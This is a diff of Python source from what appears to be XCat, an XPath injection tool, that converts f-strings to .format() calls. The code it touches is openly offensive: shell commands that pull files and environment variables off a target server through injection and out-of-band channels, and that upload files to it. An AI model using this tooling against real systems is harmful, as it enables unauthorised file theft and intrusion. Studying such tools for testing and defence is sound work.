@@ -45,39 +45,39 @@ async def find_file_by_name(requester: Requester, file_name):
 
         if requester.features['doc-function']:
             if await requester.check(doc_available(path_expression)):
-                print(f'XML file {path} available')
+                print('XML file {path} available'.format(path=path))
 
         if requester.features['unparsed-text']:
             if await requester.check(unparsed_text_available(path_expression)):
-                print(f'Text file {path} available')
+                print('Text file {path} available'.format(path=path))
 
 
 async def download_file(requester: Requester, remote_path, local_path):
     local_path = pathlib.Path(local_path)
     if local_path.exists():
-        print(f'{local_path} already exists! Not overwriting')
+        print('{local_path} already exists! Not overwriting'.format(local_path=local_path))
         return
 
     func = read_binary if requester.features['expath-file'] else read_binary_resource
     expression = string(func(remote_path))
 
-    print(f'Downloading {remote} to {local}')
+    print('Downloading {remote_path} to {local_path}'.format(remote_path=remote_path, local_path=local_path))
 
     size = await count(requester, expression, func=string_length)
-    print(f'Size: {size}')
+    print('Size: {size}'.format(size=size))
 
     CHUNK_SIZE = 5 * 1024
     result = ""
     for index in tqdm(range(1, size + 1, CHUNK_SIZE)):
         data = await get_string_via_oob(requester, substring(expression, index, CHUNK_SIZE))
         if data is None:
-            raise CommandFailed(f'Failed to download chunk {index}. Giving up. Sorry.')
+            raise CommandFailed('Failed to download chunk {index}. Giving up. Sorry.'.format(index=index))
         else:
             result += data
         sys.stdout.flush()
     sys.stdout.write('\n')
     local_path.write_bytes(base64.decodebytes(result.encode()))
-    print(f'Downloaded, saved to {local_path}')
+    print('Downloaded, saved to {local_path}'.format(local_path=local_path))
 
 
 async def read_env(requester: Requester):
@@ -87,14 +87,14 @@ async def read_env(requester: Requester):
         concat(env_name, ' = ', environment_variable(env_name))
         for env_name in all_exp[:total + 1]
     ]
-    async for variable in iterate_all(requester, env_output):
-        print(variable)
+    for variable in iterate_all(requester, env_output):
+        print(await variable)
 
 
 async def cat(requester: Requester, path):
     if requester.features['unparsed-text']:
         if not await requester.check(unparsed_text_available(path)):
-            print(f'File {path} doesn\'t seem to be available.')
+            print('File {path} doesn\'t seem to be available.'.format(path=path))
             if input('Continue anyway? [y/n] ').lower() != 'y':
                 return
 
@@ -106,30 +106,30 @@ async def cat(requester: Requester, path):
             # Line by line
             expression = unparsed_text_lines(path)
             length = await count(requester, expression)
-            print(f"Lines: {length}")
-            async for line in iterate_all(requester, expression[:length + 1]):
-                print(line)
+            print('Lines: {length}'.format(length=length))
+            for line in iterate_all(requester, expression[:length + 1]):
+                print(await line)
     elif requester.features['oob-entity-injection']:
-        path = f'file://{path}'
-        print(f'Fetching {path}')
+        path = 'file://{path}'.format(path=path)
+        print('Fetching {path}'.format(path=path))
         print(await get_file_via_entity_injection(requester, path))
 
 
 async def upload_file(requester: Requester, local_path, remote_path):
     local_path = pathlib.Path(local_path)
     if not local_path.exists():
-        print(f'Cannot find {local_path}!')
+        print('Cannot find {local_path}!'.format(local_path=local_path))
         return
 
-    print(f'Uploading {local_path} to {remote_path}')
+    print('Uploading {local_path} to {remote_path}'.format(local_path=local_path, remote_path=remote_path))
     data = local_path.read_bytes()
-    print(f'Length: {len(data)} bytes')
+    print('Length: {len} bytes'.format(len=len(data)))
 
     if requester.features['oob-http']:
         print(await upload_file_via_oob(requester, remote_path, data))
     else:
         chunks = list(split_chunks(data, 1024))
-        print(f'Uploading {len(chunks)} chunks')
+        print('Uploading {chunks} chunks'.format(chunks=len(chunks)))
 
         await requester.check(delete(remote_path))
 
@@ -141,21 +141,21 @@ async def upload_file(requester: Requester, local_path, remote_path):
                 else:
                     continue
             else:
-                raise CommandFailed(f'Failed to upload chunk {i} 5 times. Giving up. Sorry.')
+                raise CommandFailed('Failed to upload chunk {i} 5 times. Giving up. Sorry.'.format(i=i))
 
         sys.stdout.write('\n')
 
 
 async def show_help(requester: Requester):
     for command in COMMANDS:
-        print(f' * {command.name} - {command.help_display}')
-        print(f'   {command.help_text}')
+        print(' * {command.name} - {command.help_display}'.format(command=command))
+        print('   {command.help_text}'.format(command=command))
 
 
 class Command(namedtuple('Command', 'name args help_text function feature_test')):
     @property
     def help_display(self):
-        return ' '.join(f'"{arg}"' for arg in self.args)
+        return ' '.join('"{arg}"'.format(arg=arg) for arg in self.args)
 
 
 COMMANDS = [
@@ -200,8 +200,9 @@ async def run_shell(requester: Requester):
     history = FileHistory(expanduser('~/.xcat_history'))
 
     completer = WordCompleter(list(command_dict.keys()),
-                              meta_dict={command.name: f'{command.help_display} - {command.help_text}'
-                                         for command in COMMANDS},
+                              meta_dict={
+                              command.name: '{command.help_display} - {command.help_text}'.format(command=command)
+                              for command in COMMANDS},
                               sentence=True)
 
     print("XCat shell. Enter a command or 'help' for help. Funnily enough.")
@@ -221,7 +222,7 @@ async def run_shell_command(requester: Requester, cmd):
         name, args = command[0], command[1:]
 
     if name not in command_dict:
-        print(f'Command {name} not found, try "help"')
+        print('Command {name} not found, try "help"'.format(name=name))
     else:
         command = command_dict[name]
 
@@ -233,16 +234,18 @@ async def run_shell_command(requester: Requester, cmd):
     elif features_required is None:
         has_required_features = True
     else:
-        raise RuntimeError(f'Unhandled features_required: {features_required}')
+        raise RuntimeError(
+            'Unhandled features_required: {features_required}'.format(features_required=features_required))
 
     if not has_required_features:
-        print(f'Cannot use command {command.name}, not all required features are present in this injection')
+        print('Cannot use command {command.name}, not all required features are present in this injection'.format(
+            command=command))
         return
 
     try:
         await command.function(requester, *args)
     except CommandFailed as e:
-        print(f'Error! Command appeared to fail: {e}')
+        print('Error! Command appeared to fail: {e}'.format(e=e))
 
 
 def split_chunks(l, n):
